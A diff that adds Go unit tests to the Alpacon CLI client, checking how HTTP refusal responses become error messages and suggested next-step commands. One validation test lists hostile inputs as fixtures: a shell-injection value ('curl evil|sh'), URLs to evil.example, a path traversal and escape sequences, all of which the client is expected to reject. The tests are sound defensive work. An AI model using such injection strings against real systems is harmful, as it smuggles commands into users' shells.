@@ -17,14 +17,28 @@ import (
 // the client made of it.
 func sendRefusal(t *testing.T, status int, body string) error {
 	t.Helper()
+	return sendRefusalWithRetryAfter(t, status, "", body)
+}
+
+// sendRefusalWithRetryAfter is sendRefusal with a Retry-After header, none when empty.
+func sendRefusalWithRetryAfter(t *testing.T, status int, retryAfter, body string) error {
+	t.Helper()
+	return sendRefusalFrom(t, newTestClient, status, retryAfter, body)
+}
+
+func sendRefusalFrom(t *testing.T, newClient func(string) *AlpaconClient, status int, retryAfter, body string) error {
+	t.Helper()
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
+		if retryAfter != "" {
+			w.Header().Set("Retry-After", retryAfter)
+		}
 		w.WriteHeader(status)
 		_, _ = w.Write([]byte(body))
 	}))
 	t.Cleanup(ts.Close)
 
-	_, err := newTestClient(ts.URL).SendGetRequest("/api/test/")
+	_, err := newClient(ts.URL).SendGetRequest("/api/test/")
 	require.Error(t, err)
 	return err
 }
@@ -235,7 +249,7 @@ func TestSendRequest_ServerHintReplacesThePlanRemedy(t *testing.T) {
 // stays beside the hint.
 func TestPlanLimitMessage_ServerHintKeepsTheResetDay(t *testing.T) {
 	t.Parallel()
-	message, ok := planLimitMessage("websh", "websh_limit_exceeded", gatePlan, 3*24*time.Hour, "https://my-ws.zz9.alpacon.io", true)
+	message, ok := planLimitMessage("websh", "websh_limit_exceeded", utils.GatePlan, 3*24*time.Hour, "https://my-ws.zz9.alpacon.io", true)
 	require.True(t, ok)
 	assert.Equal(t, "plan limit reached: Websh hours this month. Resets in 3 days. Upgrade: https://alpacon.io/my-ws/settings/billing. Talk to us: "+talkToUsURL, message)
 }
@@ -321,4 +335,302 @@ func TestSendRequest_HintedRefusalCodeDisplay(t *testing.T) {
 	assert.Equal(t, "permission denied (HTTP 403, code: permission_denied)", err.Error())
 	assert.Equal(t, "permission_\x1b[2Jdenied", utils.StructuredErrorCode(err))
 	assert.Equal(t, "Retry later.", utils.RefusalHint(err))
+}
+
+func TestSendRequest_RefusalWithGateAndMissingNamesBothInOneLine(t *testing.T) {
+	t.Parallel()
+	const hint = "Ask an admin for the role."
+	tests := []struct {
+		name        string
+		status      int
+		body        string
+		wantMessage string
+	}{
+		{
+			name:        "403 gate and missing with a hint",
+			status:      http.StatusForbidden,
+			body:        `{"code": "rbac_permission_required", "gate": "role", "missing": ["role", "approval"], "hint": "` + hint + `"}`,
+			wantMessage: "permission denied by the role gate (HTTP 403, code: rbac_permission_required): missing role, approval",
+		},
+		{
+			name:        "429 unknown code with a gate",
+			status:      http.StatusTooManyRequests,
+			body:        `{"code": "future_throttle", "gate": "rate"}`,
+			wantMessage: "request refused by the rate gate (HTTP 429, code: future_throttle)",
+		},
+		{
+			name:        "405 unknown code with a gate and missing",
+			status:      http.StatusMethodNotAllowed,
+			body:        `{"code": "future_denied", "gate": "approval", "missing": "approval"}`,
+			wantMessage: "request refused by the approval gate (HTTP 405, code: future_denied): missing approval",
+		},
+		{
+			name:        "402 non plan gate with an unknown code",
+			status:      http.StatusPaymentRequired,
+			body:        `{"code": "future_denied", "gate": "role", "missing": "role"}`,
+			wantMessage: "request refused by the role gate (HTTP 402, code: future_denied): missing role",
+		},
+		{
+			name:        "a hint on a known code keeps the gate in the line",
+			status:      http.StatusTooManyRequests,
+			body:        `{"code": "api_rate_limited", "gate": "rate", "hint": "` + hint + `"}`,
+			wantMessage: "request refused by the rate gate (HTTP 429, code: api_rate_limited)",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := sendRefusal(t, tt.status, tt.body)
+
+			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
+			assert.Equal(t, tt.wantMessage, err.Error())
+		})
+	}
+}
+
+func TestSendRequest_GateOutsideARefusalStatusKeepsTodaysMessage(t *testing.T) {
+	t.Parallel()
+	err := sendRefusal(t, http.StatusConflict, `{"code": "future_conflict", "gate": "role"}`)
+
+	assert.Equal(t, http.StatusConflict, utils.HTTPStatusCode(err))
+	assert.Equal(t, "request failed (code: future_conflict)", err.Error())
+}
+
+func TestSendRequest_ForbiddenWithGateAndHintLeadsWithTheHint(t *testing.T) {
+	t.Parallel()
+	const hint = "Ask an admin for the role."
+	err := sendRefusal(t, http.StatusForbidden, `{"code": "rbac_permission_required", "gate": "role", "missing": "role", "hint": "`+hint+`"}`)
+
+	assert.Equal(t, "permission denied by the role gate (HTTP 403, code: rbac_permission_required): missing role", err.Error())
+	assert.Equal(t, []utils.NextAction{{Description: hint}}, utils.RefusalNextActions(err))
+}
+
+func TestSendRequest_RefusalWithNextIsNotAFieldDump(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name        string
+		status      int
+		body        string
+		wantMessage string
+	}{
+		{
+			name:        "403",
+			status:      http.StatusForbidden,
+			body:        `{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`,
+			wantMessage: "permission denied by the approval gate (HTTP 403, code: future_denied)",
+		},
+		{
+			name:        "429",
+			status:      http.StatusTooManyRequests,
+			body:        `{"code": "api_rate_limited", "next": "/api/approvals/7/"}`,
+			wantMessage: "too many requests—please try again later",
+		},
+		{
+			name:        "402",
+			status:      http.StatusPaymentRequired,
+			body:        `{"code": "future_denied", "next": "/api/approvals/7/"}`,
+			wantMessage: "request failed (code: future_denied)",
+		},
+		{
+			name:        "405",
+			status:      http.StatusMethodNotAllowed,
+			body:        `{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`,
+			wantMessage: "request refused by the approval gate (HTTP 405, code: future_denied)",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := sendRefusal(t, tt.status, tt.body)
+
+			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
+			assert.Equal(t, tt.wantMessage, err.Error())
+			assert.Equal(t, []utils.NextAction{{
+				Command:     "alpacon api /api/approvals/7/",
+				Description: "Where the server says to check on this refusal",
+			}}, utils.RefusalNextActions(err))
+		})
+	}
+}
+
+func TestSendRequest_PlanLimitNextIsShownAsTheEntitlementsRead(t *testing.T) {
+	t.Parallel()
+	err := sendRefusal(t, http.StatusPaymentRequired, `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server", "next": "/api/workspaces/workspaces/abc/entitlements/"}`)
+
+	assert.Equal(t, http.StatusPaymentRequired, utils.HTTPStatusCode(err))
+	assert.Equal(t, []utils.NextAction{{
+		Command:     "alpacon api /api/workspaces/workspaces/abc/entitlements/",
+		Description: "Where the server says to check on this refusal",
+	}}, utils.RefusalNextActions(err))
+}
+
+func TestSendRequest_NextOutsideARefusalYieldsNoAction(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name        string
+		status      int
+		body        string
+		wantMessage string
+	}{
+		{
+			name:        "400 field of that name",
+			status:      http.StatusBadRequest,
+			body:        `{"code": "validation_error", "next": "/api/approvals/7/"}`,
+			wantMessage: "next: /api/approvals/7/",
+		},
+		{
+			name:        "401",
+			status:      http.StatusUnauthorized,
+			body:        `{"code": "auth_mfa_required", "next": "/api/approvals/7/"}`,
+			wantMessage: "",
+		},
+		{
+			name:        "429 list next is a field error",
+			status:      http.StatusTooManyRequests,
+			body:        `{"code": "api_rate_limited", "next": ["Must be a valid choice."]}`,
+			wantMessage: "next: Must be a valid choice.",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := sendRefusal(t, tt.status, tt.body)
+
+			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
+			if tt.wantMessage != "" {
+				assert.Equal(t, tt.wantMessage, err.Error())
+			}
+			assert.Nil(t, utils.RefusalNextActions(err))
+		})
+	}
+}
+
+func TestSendRequest_SignerRefusalDropsNext(t *testing.T) {
+	t.Parallel()
+	signer := func(url string) *AlpaconClient {
+		ac := newTestClient(url)
+		ac.dropsRefusalNext = true
+		return ac
+	}
+
+	err := sendRefusalFrom(t, signer, http.StatusForbidden, "", `{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`)
+
+	assert.Equal(t, http.StatusForbidden, utils.HTTPStatusCode(err))
+	assert.Nil(t, utils.RefusalNextActions(err))
+}
+
+func TestSendRequest_MalformedNextYieldsNoAction(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name string
+		next string
+	}{
+		{name: "protocol relative", next: `//evil.example/x`},
+		{name: "absolute URL", next: `https://evil.example/x`},
+		{name: "backslash", next: `/a\\b`},
+		{name: "control characters", next: `/a\u001b[2Kb`},
+		{name: "newline", next: `/a\nb`},
+		{name: "over long", next: "/" + strings.Repeat("a", utils.MaxServerHintBytes)},
+		{name: "shell metacharacters", next: `/api/x;curl evil|sh`},
+		{name: "space", next: `/api/x y/`},
+		{name: "dot dot segment", next: `/api/../etc/`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := sendRefusal(t, http.StatusForbidden, `{"code": "future_denied", "gate": "approval", "next": "`+tt.next+`"}`)
+
+			assert.Nil(t, utils.RefusalNextActions(err))
+		})
+	}
+}
+
+func TestSendRequest_RetryAfterActionNeedsAGateOtherThanPlan(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name       string
+		status     int
+		retryAfter string
+		body       string
+		want       []utils.NextAction
+	}{
+		{
+			name:       "429 with the rate gate",
+			status:     http.StatusTooManyRequests,
+			retryAfter: "30",
+			body:       `{"code": "api_rate_limited", "gate": "rate"}`,
+			want:       []utils.NextAction{{Description: "Retry after 30s"}},
+		},
+		{
+			name:       "403 with the approval gate",
+			status:     http.StatusForbidden,
+			retryAfter: "30",
+			body:       `{"code": "future_denied", "gate": "approval"}`,
+			want:       []utils.NextAction{{Description: "Retry after 30s"}},
+		},
+		{
+			name:       "429 with the rate gate and an HTTP date",
+			status:     http.StatusTooManyRequests,
+			retryAfter: "Wed, 21 Oct 2026 07:28:00 GMT",
+			body:       `{"code": "api_rate_limited", "gate": "rate"}`,
+		},
+		{
+			name:       "429 without a gate",
+			status:     http.StatusTooManyRequests,
+			retryAfter: "30",
+			body:       `{"code": "api_rate_limited"}`,
+		},
+		{
+			name:       "402 with the plan gate",
+			status:     http.StatusPaymentRequired,
+			retryAfter: "864000",
+			body:       `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server"}`,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := sendRefusalWithRetryAfter(t, tt.status, tt.retryAfter, tt.body)
+
+			assert.Equal(t, tt.want, utils.RefusalNextActions(err))
+		})
+	}
+}
+
+func TestSendRequest_OlderServerRefusalsKeepTodaysOutput(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name        string
+		status      int
+		body        string
+		wantMessage string
+	}{
+		{
+			name:        "403 with only a code",
+			status:      http.StatusForbidden,
+			body:        `{"code": "user_no_permission"}`,
+			wantMessage: "permission denied: you do not have the required privileges for this action",
+		},
+		{
+			name:        "429 with only a code",
+			status:      http.StatusTooManyRequests,
+			body:        `{"code": "api_rate_limited"}`,
+			wantMessage: "too many requests—please try again later",
+		},
+		{
+			name:        "429 with an unknown code",
+			status:      http.StatusTooManyRequests,
+			body:        `{"code": "future_throttle"}`,
+			wantMessage: "request failed (code: future_throttle)",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := sendRefusal(t, tt.status, tt.body)
+
+			assert.Equal(t, tt.wantMessage, err.Error())
+			assert.Nil(t, utils.RefusalNextActions(err))
+		})
+	}
 }
